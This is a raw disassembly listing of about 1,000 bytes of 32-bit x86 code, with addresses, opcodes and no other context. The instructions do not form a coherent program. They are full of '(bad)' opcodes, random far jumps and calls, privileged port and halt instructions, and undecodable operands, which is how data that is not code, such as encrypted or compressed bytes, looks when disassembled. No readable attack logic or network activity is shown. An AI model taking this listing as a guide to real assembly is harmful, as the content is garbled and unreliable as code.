  421a0a:	jmp    0x8b4908ba
  421a0f:	addr16 push ebx
  421a11:	push   cs
  421a12:	jecxz  0x421a6a
  421a14:	sbb    BYTE PTR ds:0x1829726,cl
  421a1a:	popf   
  421a1b:	rcl    DWORD PTR [ecx],0xcd
  421a1e:	xchg   esi,eax
  421a1f:	xlat   BYTE PTR ds:[ebx]
  421a20:	das    
  421a21:	arpl   WORD PTR [esi+0x3bb8ffe5],cx
  421a27:	sub    BYTE PTR [edi],al
  421a29:	inc    ecx
  421a2a:	(bad)  
  421a2b:	xlat   BYTE PTR ds:[ebx]
  421a2c:	std    
  421a2d:	pop    ebp
  421a2e:	retf   
  421a2f:	adc    DWORD PTR [ebx-0x58],ebx
  421a32:	bound  ebx,QWORD PTR [ecx+0x23]
  421a35:	jmp    0x7961:0x6eeb41d8
  421a3c:	sbb    al,BYTE PTR [ebp+0x66b6f1dc]
  421a42:	mov    ebp,DWORD PTR [esi-0x7b5fa6bf]
  421a48:	jmp    0x1da7864a
  421a4d:	ficomp WORD PTR [ebx+0x7abbcfe8]
  421a53:	mov    bl,ch
  421a55:	fdiv   QWORD PTR [edx]
  421a57:	fidivr WORD PTR [ebx]
  421a59:	add    bl,dh
  421a5b:	pusha  
  421a5c:	scas   al,BYTE PTR es:[edi]
  421a5d:	xor    edx,DWORD PTR [esi+0x14]
  421a60:	jnp    0x421a3c
  421a62:	inc    eax
  421a63:	(bad)  
  421a64:	xchg   edx,eax
  421a65:	xchg   ecx,eax
  421a66:	adc    cl,dl
  421a68:	pop    ebx
  421a69:	imul   ebx,ebx,0x37
  421a6c:	fwait
  421a6d:	xlat   BYTE PTR ds:[ebx]
  421a6e:	dec    edi
  421a6f:	(bad)  
  421a70:	and    eax,0xaeb64ed1
  421a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a76:	xchg   esp,eax
  421a77:	mov    edi,0xc10c16e9
  421a7c:	push   cs
  421a7d:	add    al,0x84
  421a7f:	and    eax,0x48eb5a28
  421a84:	repz cmc 
  421a86:	ins    BYTE PTR es:[edi],dx
  421a87:	(bad)  
  421a88:	cli    
  421a89:	mov    al,ds:0xd714f487
  421a8e:	ret    
  421a8f:	push   0xd27de5ed
  421a94:	cli    
  421a95:	jae    0x421ada
  421a97:	cli    
  421a98:	rcl    BYTE PTR [ecx],1
  421a9a:	(bad)  
  421a9b:	scas   eax,DWORD PTR es:[edi]
  421a9c:	push   edi
  421a9d:	dec    esi
  421a9e:	push   ecx
  421a9f:	mov    al,0xc2
  421aa1:	or     ah,BYTE PTR [esi+edx*8-0x7f]
  421aa5:	ins    BYTE PTR es:[edi],dx
  421aa6:	mov    eax,ds:0x6bb26465
  421aab:	and    al,BYTE PTR [ebx+0x757fafd0]
  421ab1:	pop    es
  421ab2:	imul   ebx,DWORD PTR [esi-0x54],0x59690cf0
  421ab9:	mov    bx,0x86ea
  421abd:	mov    bl,ch
  421abf:	mov    dl,0xee
  421ac1:	shr    dl,0x97
  421ac4:	pushf  
  421ac5:	pop    ds
  421ac6:	mov    DWORD PTR [edi+0x14],eax
  421ac9:	stc    
  421aca:	adc    ecx,DWORD PTR [edi+0x705f1208]
  421ad0:	test   DWORD PTR [ebp-0x21],ecx
  421ad3:	push   ebx
  421ad4:	add    edx,DWORD PTR [edx+eiz*8-0x43]
  421ad8:	or     al,0xc2
  421ada:	lds    esp,FWORD PTR [edi]
  421adc:	mov    WORD PTR [ecx],?
  421ade:	(bad)  
  421adf:	sbb    BYTE PTR [edi-0x6eb446a1],dl
  421ae5:	jno    0x421b23
  421ae7:	push   eax
  421ae8:	sub    BYTE PTR [esi-0x49189808],dl
  421aee:	sbb    BYTE PTR [ecx+0x39],bh
  421af1:	popa   
  421af2:	imul   edi,DWORD PTR [ecx+0x4b],0xd3ac04e6
  421af9:	retf   0x495c
  421afc:	cwde   
  421afd:	imul   DWORD PTR [edi-0x5c]
  421b00:	inc    ah
  421b02:	mov    dh,0x18
  421b04:	cwde   
  421b05:	push   esp
  421b06:	or     esi,0xcc8296fc
  421b0c:	xchg   esi,eax
  421b0d:	cwde   
  421b0e:	add    bh,ah
  421b10:	and    eax,0xf3cafda2
  421b15:	int3   
  421b16:	ror    BYTE PTR [esi+0x79],1
  421b19:	push   esi
  421b1a:	and    BYTE PTR [ebx],al
  421b1c:	mov    ss:0x852d805,eax
  421b22:	push   edi
  421b23:	and    BYTE PTR [eax+0x768711c4],cl
  421b29:	mov    eax,ds:0x843c1d91
  421b2e:	fsubr  QWORD PTR [eax+0x61]
  421b31:	mov    bl,al
  421b33:	fisttp DWORD PTR [eax+0x36]
  421b36:	add    cl,BYTE PTR [esp+edi*2-0x5]
  421b3a:	ror    ch,cl
  421b3c:	cdq    
  421b3d:	add    ch,dl
  421b3f:	jg     0x421b23
  421b41:	pop    edi
  421b42:	in     al,0xf2
  421b44:	mov    edi,0xff7eb839
  421b49:	div    ah
  421b4b:	or     DWORD PTR [ebx+0x170d7afe],esi
  421b51:	in     al,dx
  421b52:	das    
  421b53:	dec    esi
  421b54:	jnp    0x421af7
  421b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b57:	sbb    DWORD PTR [edi-0x4e7489b0],ecx
  421b5d:	push   0xffffffa5
  421b5f:	hlt    
  421b60:	ins    DWORD PTR es:[edi],dx
  421b61:	mov    al,ds:0x482e68de
  421b66:	jp     0x421b71
  421b68:	hlt    
  421b69:	mov    edi,0x29b3dbb1
  421b6e:	scas   al,BYTE PTR es:[edi]
  421b6f:	cwde   
  421b70:	pop    edx
  421b71:	push   ds
  421b72:	or     ah,BYTE PTR [eax-0x1]
  421b75:	sub    ah,BYTE PTR [edx-0x47]
  421b78:	adc    eax,0xea474f73
  421b7d:	push   ds
  421b7e:	leave  
  421b7f:	fdivr  QWORD PTR [edx+0x47050822]
  421b85:	and    edx,DWORD PTR [edx-0x53700cee]
  421b8b:	dec    esi
  421b8c:	pop    edx
  421b8d:	inc    edx
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	xor    edi,DWORD PTR [esi]
  421b91:	jne    0x421b34
  421b93:	lds    ebx,FWORD PTR [ecx]
  421b95:	pop    esp
  421b96:	push   eax
  421b97:	xor    edx,ecx
  421b99:	push   esi
  421b9a:	pop    ecx
  421b9b:	xor    ecx,esp
  421b9d:	sbb    eax,0x5301436a
  421ba2:	xor    ebx,DWORD PTR [esi]
  421ba4:	dec    edi
  421ba5:	loopne 0x421bac
  421ba7:	push   eax
  421ba8:	inc    ebp
  421ba9:	inc    ecx
  421baa:	ja     0x421b78
  421bac:	push   cs
  421bad:	cmp    BYTE PTR [ebp-0xb3027c],ah
  421bb3:	mov    esi,cs
  421bb5:	xor    ecx,ecx
  421bb7:	lds    esp,FWORD PTR [edx+0x6b8ab972]
  421bbd:	dec    ebx
  421bbe:	jmp    0x2aee:0x8887b4a8
  421bc5:	scas   eax,DWORD PTR es:[edi]
  421bc6:	sub    al,0x1
  421bc8:	sub    DWORD PTR [eax-0x6cbb263b],0x5c99b707
  421bd2:	fwait
  421bd3:	pop    es
  421bd4:	cld    
  421bd5:	mov    ebx,0x74dc405f
  421bda:	sbb    eax,0x4ecdbe85
  421bdf:	push   edi
  421be0:	add    ch,BYTE PTR ds:0xf687a352
  421be6:	mov    edi,0x4931bdab
  421beb:	xlat   BYTE PTR ds:[ebx]
  421bec:	jnp    0x421b9d
  421bee:	push   ss
  421bef:	inc    edi
  421bf0:	inc    esi
  421bf1:	pop    esp
  421bf2:	in     eax,0x3d
  421bf4:	(bad)  
  421bf5:	fisttp DWORD PTR [edi]
  421bf7:	xchg   BYTE PTR [edi],bl
  421bf9:	or     eax,0xa2f625d4
  421bfe:	sub    ch,dl
  421c00:	shl    ch,cl
  421c02:	jecxz  0x421c49
  421c04:	add    BYTE PTR [eax],al
  421c06:	add    BYTE PTR [eax],al
  421c08:	add    BYTE PTR [eax],al
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x4ce5168e]
  421c18:	or     eax,0x1aadedf
  421c1d:	add    BYTE PTR [edx+0x7e000006],al
  421c23:	pop    esi
  421c24:	adc    DWORD PTR [ebx],edx
  421c26:	mov    al,0xfb
  421c28:	loop   0x421c96
  421c2a:	cwde   
  421c2b:	xchg   edi,eax
  421c2c:	int3   
  421c2d:	mov    bh,0x7
  421c2f:	push   esi
  421c30:	loopne 0x421cad
  421c32:	std    
  421c33:	into   
  421c34:	imul   ecx,DWORD PTR [ecx+edx*1],0x5576b23a
  421c3b:	std    
  421c3c:	frstor [edx]
  421c3e:	sbb    BYTE PTR [edx-0x37],0xda
  421c42:	adc    al,0xa5
  421c44:	shl    edi,1
  421c46:	fadd   DWORD PTR ds:0xde886997
  421c4c:	mov    ecx,0xf2460495
  421c51:	ja     0x421c22
  421c53:	popa   
  421c54:	mov    bl,0xc9
  421c56:	pop    ecx
  421c57:	popf   
  421c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c59:	push   ss
  421c5a:	outs   dx,DWORD PTR ds:[esi]
  421c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c5c:	cs jmp 0x5163:0x8cd718b9
  421c64:	push   esp
  421c65:	js     0x421c74
  421c67:	push   0xc5c6747e
  421c6c:	or     eax,0xe9d69c1d
  421c71:	arpl   WORD PTR [ebx-0x24b6670],ax
  421c77:	jmp    0x2a5f:0x30eaed69
  421c7e:	dec    ch
  421c80:	push   ebp
  421c81:	in     eax,dx
  421c82:	add    al,0x38
  421c84:	mov    ebp,0xc4814cfd
  421c89:	dec    eax
  421c8a:	std    
  421c8b:	mov    al,ds:0x1c57bcf7
  421c90:	xor    al,0xc8
  421c92:	call   0xa2e1294f
  421c97:	sub    BYTE PTR [ebx-0x3c],ch
  421c9a:	pop    esi
  421c9b:	hlt    
  421c9c:	dec    ecx
  421c9d:	arpl   WORD PTR [ecx],bp
  421c9f:	aaa    
  421ca0:	imul   ebx,DWORD PTR [edx+0x37d4bd2f],0x83f44b65
  421caa:	or     eax,0xb952ab7d
  421caf:	outs   dx,DWORD PTR ds:[esi]
  421cb0:	adc    eax,0xba5e1397
  421cb5:	or     ecx,esi
  421cb7:	vpsubsb xmm4,xmm4,XMMWORD PTR [edi]
  421cbb:	imul   ebp,DWORD PTR [eax-0x25],0x4d
  421cbf:	pushf  
  421cc0:	jmp    0x6130a011
  421cc5:	retf   0x927f
  421cc8:	cmp    dl,BYTE PTR [eax]
  421cca:	pop    edx
  421ccb:	add    eax,0x6898ee1d
  421cd0:	adc    eax,0xcc654138
  421cd5:	test   eax,0xc9705aa4
  421cda:	push   ebx
  421cdb:	imul   ebx,esi,0x16
  421cde:	in     eax,dx
  421cdf:	or     eax,0xbe761ed6
  421ce4:	fisttp DWORD PTR [ebp+ebp*4+0x24138b49]
  421ceb:	pop    esp
  421cec:	repz xor ah,BYTE PTR [eax]
  421cef:	sub    dl,BYTE PTR [esi+0x2238a3dc]
  421cf5:	repz imul esp,DWORD PTR [edi+0x3d],0xffffffce
  421cfa:	rcr    BYTE PTR [ebx+0xf9b7ec1],cl
  421d00:	test   DWORD PTR [ebp-0x19],ebp
  421d03:	sbb    dl,BYTE PTR [ecx]
  421d05:	mov    WORD PTR [eax],?
  421d07:	popa   
  421d08:	dec    esp
  421d09:	leave  
  421d0a:	push   edi
  421d0b:	imul   edi,DWORD PTR [ebp-0x3249a284],0xe6af309a
  421d15:	cmp    al,0x27
  421d17:	mov    cl,0xd4
  421d19:	sbb    bl,BYTE PTR [eax]
  421d1b:	cmp    ebx,edx
  421d1d:	ins    DWORD PTR es:[edi],dx
  421d1e:	mov    cl,0x70
  421d20:	push   es
  421d21:	mov    eax,0x12887428
  421d26:	pushf  
  421d27:	xor    BYTE PTR [ebp+0x2f],bh
  421d2a:	lods   eax,DWORD PTR ds:[esi]
  421d2b:	jle    0x421d66
  421d2d:	sub    al,BYTE PTR [edi-0x181cf81e]
  421d33:	lods   eax,DWORD PTR ds:[esi]
  421d34:	clc    
  421d35:	fst    QWORD PTR [esi]
  421d37:	push   0xffffffff
  421d39:	fldenv [esi+0x16]
  421d3c:	rcl    BYTE PTR [edi+0x7637eead],1
  421d42:	sbb    eax,0x4ee35c47
  421d47:	jmp    0x4878:0xd1beca4b
  421d4e:	sbb    eax,0x840ab6b9
  421d53:	push   ecx
  421d54:	cmc    
  421d55:	and    eax,0xd798b4cf
  421d5a:	push   0xe2adbee4
  421d5f:	rcr    bh,1
  421d61:	pop    esi
  421d62:	inc    edi
  421d63:	add    BYTE PTR [edx-0x45],bl
  421d66:	xor    dl,ah
  421d68:	sbb    DWORD PTR [edi+0x16],edx
  421d6b:	push   ebp
  421d6c:	inc    esi
  421d6d:	and    dl,bl
  421d6f:	adc    BYTE PTR [ecx+0xa],al
  421d72:	inc    ebx
  421d73:	push   edi
  421d74:	clc    
  421d75:	mov    DWORD PTR [ecx],eax
  421d77:	mov    edi,ss
  421d79:	jne    0x421d43
  421d7b:	mov    DWORD PTR [edi],ecx
  421d7d:	pop    ecx
  421d7e:	dec    esp
  421d7f:	xchg   ebp,eax
  421d80:	pop    ss
  421d81:	es mov esp,esp
  421d84:	nop
  421d85:	xchg   edx,eax
  421d86:	or     BYTE PTR [edx-0x5a15b8b5],0xb5
  421d8d:	push   0xffffffca
  421d8f:	out    0x19,al
  421d91:	lea    eax,[edx-0x105bdc7e]
  421d97:	sbb    eax,0x8e5f9150
  421d9c:	jae    0x421dcf
  421d9e:	fisub  WORD PTR [eax+eiz*8-0xb]
  421da2:	pop    ebp
  421da3:	cmp    BYTE PTR [eax+0x3b],cl
  421da6:	dec    ecx
  421da7:	push   edi
  421da8:	mov    esp,0x567e24cf
  421dad:	add    dl,cl
  421daf:	xchg   edx,eax
  421db0:	(bad)  
  421db1:	retf   0x412c
  421db4:	call   0x1836:0x63ab5371
  421dbb:	ins    BYTE PTR es:[edi],dx
  421dbc:	aas    
  421dbd:	and    al,0x42
  421dbf:	aaa    
  421dc0:	add    eax,0xf755fad1
  421dc5:	cmp    DWORD PTR [ebp-0x2d],0xffffff8a
  421dc9:	enter  0xce37,0xaf
  421dcd:	sbb    cl,ch
  421dcf:	xor    dl,ah
  421dd1:	push   eax
  421dd2:	enter  0xc2bf,0xaf
  421dd6:	xor    bh,cl
  421dd8:	jnp    0x421d91
  421dda:	es jmp 0xfbd77dc8
  421de0:	or     al,al
  421de2:	stos   DWORD PTR es:[edi],eax
  421de3:	ds push ecx
  421de5:	sub    BYTE PTR [edx-0x39],bl
  421de8:	mov    ah,0xf3
  421dea:	lock push ebp
  421dec:	repnz xor DWORD PTR [ebp+0x427241b7],ebx
  421df3:	xchg   edi,eax
  421df4:	leave  
  421df5:	adc    ah,BYTE PTR [ebp+0x7d4eb016]
  421dfb:	fwait
  421dfc:	sti    
  421dfd:	int    0x3d
  421dff:	or     al,0x92
  421e01:	aad    0x20
  421e03:	sbb    esp,0xbac746b9
  421e09:	test   BYTE PTR [ebx],al
  421e0b:	(bad)  
  421e0c:	lock hlt 
  421e0e:	cli    
  421e0f:	idiv   ah
  421e11:	jmp    0x5a5a17cc
  421e16:	push   ebx
  421e17:	lods   eax,DWORD PTR ds:[esi]
  421e18:	ds mov bh,0x2c
  421e1b:	psllw  mm6,QWORD PTR [edx+0x3b]
  421e1f:	or     BYTE PTR [ebp-0x68],cl
  421e22:	xchg   esi,eax
  421e23:	aad    0xd7
  421e25:	add    DWORD PTR [edi-0x60f96c5d],ebx
  421e2b:	lahf   
  421e2c:	sti    
  421e2d:	lea    ecx,[edi-0x76fbc4a1]
  421e33:	jge    0x421de8
  421e35:	outs   dx,BYTE PTR ds:[esi]
  421e36:	pop    ecx
  421e37:	and    esp,DWORD PTR [ecx+0x3e]
  421e3a:	add    BYTE PTR [esi-0x2161d0cf],ch
  421e40:	mov    cs,WORD PTR [eax-0x53]
  421e43:	xchg   esi,eax
  421e44:	sbb    ebx,DWORD PTR [edx+0x5e]
  421e47:	mov    dl,0x92
  421e49:	nop
  421e4a:	mov    bh,al
  421e4c:	dec    ebp
  421e4d:	leave  
  421e4e:	scas   eax,DWORD PTR es:[edi]
  421e4f:	pop    ecx
  421e50:	push   cs
  421e51:	(bad)  
  421e52:	loope  0x421ebd
  421e54:	xchg   edi,eax
  421e55:	sub    BYTE PTR [ecx],dh
  421e57:	or     eax,0x3a122540
  421e5c:	iret   
  421e5d:	inc    edx
  421e5e:	arpl   WORD PTR [edi-0x5e0cc65e],dx
  421e64:	les    esi,FWORD PTR ds:0x912d9b94
  421e6a:	gs ins DWORD PTR es:[edi],dx
  421e6c:	sar    DWORD PTR [ebp-0x4f],0xe1
  421e70:	daa    
  421e71:	and    esp,DWORD PTR [edi+0x7d]
  421e74:	stos   BYTE PTR es:[edi],al
  421e75:	or     eax,0xc51ad1c0
  421e7a:	xchg   ebp,eax
  421e7b:	cld    
  421e7c:	jmp    0x421e3e
  421e7e:	addr16 in eax,dx
  421e80:	fst    DWORD PTR [ecx-0x23]
  421e83:	leave  
  421e84:	sti    
  421e85:	jmp    0x421efa
  421e87:	int    0xbd
  421e89:	cmp    DWORD PTR ds:[edi],edi
  421e8c:	push   0xc5fb8c50
  421e91:	pusha  
  421e92:	aas    
  421e93:	cld    
  421e94:	in     al,dx
  421e95:	pop    edi
  421e96:	mov    edx,DWORD PTR [ecx-0x47]
  421e99:	mov    al,ds:0x406c2f43
  421e9e:	jno    0x421ee6
  421ea0:	dec    ebp
  421ea1:	mov    dl,0xef
  421ea3:	dec    ebx
  421ea4:	enter  0xd273,0x32
  421ea8:	adc    DWORD PTR [ebx-0x6cc4dbf],eax
  421eae:	jo     0x421e6f
  421eb0:	daa    
  421eb1:	xchg   edi,eax
  421eb2:	pop    edx
  421eb3:	cld    
  421eb4:	dec    edi
  421eb5:	leave  
  421eb6:	cmp    DWORD PTR [edi+0x53f3ff79],ecx
  421ebc:	test   eax,0xa02fcde
  421ec1:	js     0x421e90
  421ec3:	lods   eax,DWORD PTR ds:[esi]
  421ec4:	enter  0x2a4a,0xb3
  421ec8:	mov    gs,WORD PTR [edx+0x5e4ea3a1]
  421ece:	jp     0x421eb0
  421ed0:	push   cs
  421ed1:	push   es
  421ed2:	dec    ecx
  421ed3:	mov    ecx,0x569d1c0f
  421ed8:	(bad)  
  421ed9:	ins    DWORD PTR es:[edi],dx
  421eda:	cmp    al,BYTE PTR [edx+edi*2-0x28]
  421ede:	pop    edx
  421edf:	inc    ebp
  421ee0:	jae    0x421f4e
  421ee2:	cmp    al,0xc4
  421ee4:	mov    DWORD PTR [edi-0x7769b239],esi
  421eea:	leave  
  421eeb:	stos   BYTE PTR es:[edi],al
  421eec:	jp     0x421e9e
  421eee:	mov    edi,0x158cec67
  421ef3:	ss pop ebx
  421ef5:	rcl    BYTE PTR [ebx+0x3a],cl
  421ef8:	(bad)  
  421ef9:	into   
  421efa:	fistp  QWORD PTR [ecx+0x6e9b1a61]
  421f00:	ss iret 
  421f02:	cwde   
  421f03:	or     DWORD PTR [ecx-0x6a72d186],edx
  421f09:	adc    BYTE PTR [ebx+0x4704491e],0xc9
  421f10:	(bad)  
  421f12:	pushf  
  421f13:	jle    0x421f62
  421f15:	push   ds
  421f16:	setae  BYTE PTR [esi-0x793c6c65]
  421f1d:	xchg   edi,eax
  421f1e:	ins    BYTE PTR es:[edi],dx
  421f1f:	div    DWORD PTR [ebp+ecx*8-0x1a4f6a]
  421f26:	int    0x58
  421f28:	out    0xa3,eax
  421f2a:	add    bh,bl
  421f2c:	inc    edi
  421f2d:	out    dx,eax
  421f2e:	stos   DWORD PTR es:[edi],eax
  421f2f:	or     ch,BYTE PTR [eax+0x39]
  421f32:	pusha  
  421f33:	and    esi,DWORD PTR [ebp-0x3bfec869]
  421f39:	retf   
  421f3a:	adc    BYTE PTR [eax],ah
  421f3c:	xchg   ecx,eax
  421f3d:	xor    dl,bh
  421f3f:	pop    eax
  421f40:	inc    esp
  421f41:	arpl   bx,cx
  421f43:	push   cs
  421f44:	(bad)  
  421f45:	out    dx,eax
  421f46:	cmp    esp,ebp
  421f48:	xor    BYTE PTR [ebx-0x36ae0b4a],bh
  421f4e:	loope  0x421f9a
  421f50:	mov    edi,DWORD PTR [ecx]
  421f52:	lds    ecx,FWORD PTR [ebp-0x45]
  421f55:	or     BYTE PTR [edi],al
  421f57:	aas    
  421f58:	pop    ss
  421f59:	into   
  421f5a:	retf   
  421f5b:	or     eax,0x76b353c6
  421f60:	not    DWORD PTR [edx-0xa247a08]
  421f66:	mov    cl,0x1e
  421f68:	mov    eax,ss
  421f6a:	add    eax,DWORD PTR [ebp+edx*2-0x10]
  421f6e:	retf   
  421f6f:	je     0x421f59
  421f71:	sar    DWORD PTR [esi+ebx*4+0x51],0x1e
  421f76:	mov    dl,0xb6
  421f78:	repnz test DWORD PTR [edi],edi
  421f7b:	gs shl ebp,0xea
  421f7f:	outs   dx,DWORD PTR ds:[esi]
  421f80:	push   esp
  421f81:	cmp    al,ah
  421f83:	add    DWORD PTR [edx+edx*4+0x60],edx
  421f87:	aas    
  421f88:	jmp    0xd9c5:0x1195fd46
  421f8f:	push   esp
  421f90:	mov    ah,0xea
  421f92:	adc    al,0x93
  421f94:	jle    0x421fc6
  421f96:	lahf   
  421f97:	sub    BYTE PTR [ebx+0x62dd8a39],bh
  421f9d:	mov    edi,0x3e271b1
  421fa2:	mov    WORD PTR [eax-0x23b1dbf],fs
  421fa8:	imul   esp,DWORD PTR gs:[esi-0x6c],0x9d95d855
  421fb0:	dec    ebp
  421fb1:	sbb    DWORD PTR [ecx+0xee5b757],edx
  421fb7:	xor    edx,ecx
  421fb9:	(bad)  
  421fba:	retf   0xf41f
  421fbd:	jne    0x421faf
  421fbf:	and    BYTE PTR [ebx-0x4c66ab41],bh
  421fc5:	and    eax,0xc175a522
  421fca:	inc    eax
  421fcb:	sbb    edi,DWORD PTR [eax-0x39d10cec]
  421fd1:	call   0x4f9a:0x69d27d
  421fd8:	xchg   bh,ch
  421fda:	and    BYTE PTR [ebx],0x60
  421fdd:	mov    esp,0xfc38782e
  421fe2:	lods   eax,DWORD PTR ds:[esi]
  421fe3:	test   DWORD PTR [ecx],ebx
  421fe5:	mov    cl,0x10
  421fe7:	inc    esp
  421fe8:	in     al,0x5c
  421fea:	(bad)  
  421feb:	clc    
  421fec:	neg    BYTE PTR [edx-0xc]
  421fef:	xor    al,0xfe
  421ff1:	cmp    eax,0xd141ac4
  421ff6:	(bad)  
  421ff7:	jo     0x421f8c
  421ff9:	pop    ebp
  421ffa:	test   BYTE PTR [ebx+0x30],ah
  421ffd:	(bad)  
  421ffe:	jo     0x42205c
  422000:	mov    eax,0xe77b34f9
  422005:	je     0x421faf
  422007:	inc    ecx
  422008:	aaa    
  422009:	xor    eax,0xccd23872
  42200e:	loope  0x42207b
  422010:	and    dh,BYTE PTR [ebx]
  422012:	xchg   DWORD PTR [edi],ebp
  422014:	pop    ss
  422015:	xchg   ecx,eax
  422016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422017:	jle    0x421fba
  422019:	dec    esp
  42201a:	xor    al,0x52
  42201c:	pop    edi
  42201d:	push   ss
  42201e:	rcr    DWORD PTR [ebx-0x75],1
  422021:	sub    BYTE PTR [esi+0x11],0x2e
  422025:	call   0xe363:0x7dba319a
  42202c:	or     cl,bl
  42202e:	push   es
  42202f:	in     al,dx
  422030:	js     0x422072
  422032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422033:	out    dx,al
  422034:	sar    DWORD PTR [edx-0x1e],0x50
  422038:	add    DWORD PTR [ebp+0x20f34f97],esp
  42203e:	pusha  
  42203f:	(bad)  
  422040:	pop    edi
  422041:	jecxz  0x422011
  422043:	push   edi
  422044:	sbb    edx,DWORD PTR [edx]
  422046:	(bad)  
  422047:	sti    
  422048:	add    esp,edi
  42204a:	push   0xffffff9d
  42204c:	mov    al,ds:0xa1bb9f26
  422051:	icebp  
  422052:	iret   
  422053:	bnd call 0x37a61399
  422059:	pop    esi
  42205a:	in     eax,0xf5
  42205c:	jle    0x422086
  42205e:	dec    ecx
  42205f:	mov    ds:0x36712d95,eax
  422064:	xchg   ebp,eax
  422065:	adc    al,0x10
  422067:	test   ch,cl
  422069:	dec    esi
  42206a:	pop    edx
  42206b:	mov    bh,0x6
  42206d:	cs cmp eax,0xa3d9e055
  422073:	ror    BYTE PTR [esi-0xc772d51],0x82
  42207a:	pop    ebx
  42207b:	shl    DWORD PTR [ebp-0x4048d144],cl
  422081:	inc    esp
  422082:	add    bh,BYTE PTR [ebx+0x5a]
  422085:	mov    cl,0x36
  422087:	xchg   BYTE PTR ds:0x7929e0ba,al
  42208d:	or     bl,BYTE PTR [eax-0x4333873a]
  422093:	sbb    BYTE PTR [esi+0x120ceb37],dl
  422099:	xchg   esi,eax
  42209a:	dec    eax
  42209b:	mov    cl,0x69
  42209d:	pop    esi
  42209e:	rcr    BYTE PTR [edx],1
  4220a0:	ret    
  4220a1:	(bad)  
  4220a2:	sti    
  4220a3:	push   0x3d
  4220a5:	dec    DWORD PTR [esi+0x66425a80]
  4220ab:	cli    
  4220ac:	shl    DWORD PTR [edx-0x283fa746],1
  4220b2:	and    edx,ebp
  4220b4:	xor    edx,DWORD PTR [esi-0x77]
  4220b7:	cmp    BYTE PTR [esi],0x79
  4220ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220bb:	push   es
  4220bc:	popa   
  4220bd:	add    ebp,esp
  4220bf:	call   0xb5a4:0x5fd57fdb
  4220c6:	icebp  
  4220c7:	gs mov eax,0xfb06a3bb
  4220cd:	inc    ebp
  4220ce:	stos   DWORD PTR es:[edi],eax
  4220cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220d0:	rol    BYTE PTR [ebp-0x2e],0x94
  4220d4:	pop    ecx
  4220d5:	retf   0x6707
  4220d8:	pop    esp
  4220d9:	retf   
  4220da:	mov    eax,0xba366bfb
  4220df:	mov    ds:0x14ea6a27,eax
  4220e4:	je     0x4220b5
  4220e6:	adc    ah,BYTE PTR [ecx]
  4220e8:	xchg   esi,eax
  4220e9:	push   cs
  4220ea:	sub    DWORD PTR [ecx-0x79a547d5],ebp
  4220f0:	mov    al,ds:0x7bb6ea8c
  4220f5:	push   cs
  4220f6:	stos   BYTE PTR es:[edi],al
  4220f7:	into   
  4220f8:	arpl   WORD PTR [edi-0x16cc211],dx
  4220fe:	enter  0x8ec,0x55
  422102:	imul   eax,DWORD PTR [edi+0x7e],0x78544a36
  422109:	and    eax,0x6904012
  42210e:	shr    BYTE PTR [ecx+0x1b],1
  422111:	cs pop edx
  422113:	push   esp
  422114:	xchg   ecx,eax
  422115:	sub    dl,BYTE PTR [edx+0x2af19305]
  42211b:	cwde   
  42211c:	ins    DWORD PTR es:[edi],dx
  42211d:	cmp    BYTE PTR [ebp-0x32b1a981],cl
  422123:	adc    BYTE PTR [ebp-0x51],0xd4
  422127:	cld    
  422128:	pop    esp
  422129:	cwde   
  42212a:	cmp    edx,ebx
  42212c:	xor    al,0xda
  42212e:	mov    ah,ch
  422130:	clc    
  422131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422132:	iret   
  422133:	xchg   ecx,eax
  422134:	push   esi
  422135:	je     0x422131
  422137:	push   esp
  422138:	jp     0x422153
  42213a:	pop    ebx
  42213b:	ror    BYTE PTR [edx+esi*2+0x27088335],cl
  422142:	mov    ah,0x9e
  422144:	sub    esi,esp
  422146:	mov    ebx,0xa71dcc91
  42214b:	fistp  DWORD PTR [ebx+0x3c]
  42214e:	int3   
  42214f:	xor    al,0x42
  422151:	jne    0x422138
  422153:	or     BYTE PTR [edi+0x68],ah
  422156:	jle    0x422115
  422158:	(bad)  
  422159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215b:	and    bh,BYTE PTR [ecx+0x65]
  42215e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215f:	add    DWORD PTR [eax+0x17bebb18],esp
  422165:	iret   
  422166:	jb     0x422118
  422168:	mov    edi,0xba5018c4
  42216d:	addr16 je 0x42212b
  422170:	adc    eax,0xe8334975
  422175:	cdq    
  422176:	sub    al,0x1e
  422178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422179:	mov    dl,0xce
  42217b:	das    
  42217c:	mov    ?,esi
  42217e:	inc    esi
  42217f:	push   ss
  422180:	daa    
  422181:	je     0x422190
  422183:	jno    0x42217d
  422185:	push   0x1e48b941
  42218a:	jno    0x422135
  42218c:	dec    ecx
  42218d:	cmp    ecx,DWORD PTR [ebp-0x69]
  422190:	les    edx,FWORD PTR [edx-0x66]
  422193:	hlt    
  422194:	je     0x4221e0
  422196:	sbb    al,0x4b
  422198:	jae    0x4221c3
  42219a:	sbb    eax,0x18cd5287
  42219f:	xor    cl,BYTE PTR [edx+0x3e]
  4221a2:	ins    BYTE PTR es:[edi],dx
  4221a3:	fsubr  DWORD PTR [ebp+edx*1+0x5e]
  4221a7:	inc    ebp
  4221a8:	push   edx
  4221a9:	mov    edi,DWORD PTR [esi]
  4221ab:	ror    DWORD PTR [esi+0x3b0e6d07],1
  4221b1:	pop    ds
  4221b2:	sub    al,BYTE PTR [eax-0x55]
  4221b5:	mov    ah,0x94
  4221b7:	sub    edi,esp
  4221b9:	push   eax
  4221ba:	pop    ebp
  4221bb:	dec    ebx
  4221bc:	out    0x7,al
  4221be:	cld    
